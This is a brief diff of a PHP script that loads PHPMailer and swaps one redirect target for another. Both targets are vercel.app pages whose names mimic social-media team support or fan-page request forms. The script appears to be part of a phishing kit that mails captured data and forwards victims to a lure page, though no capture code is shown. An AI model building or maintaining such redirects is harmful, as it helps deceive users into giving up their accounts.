@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://request-team-support-form-apply-on.vercel.app/");
+header("Location: https://apply-form-team-request-fanpage.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
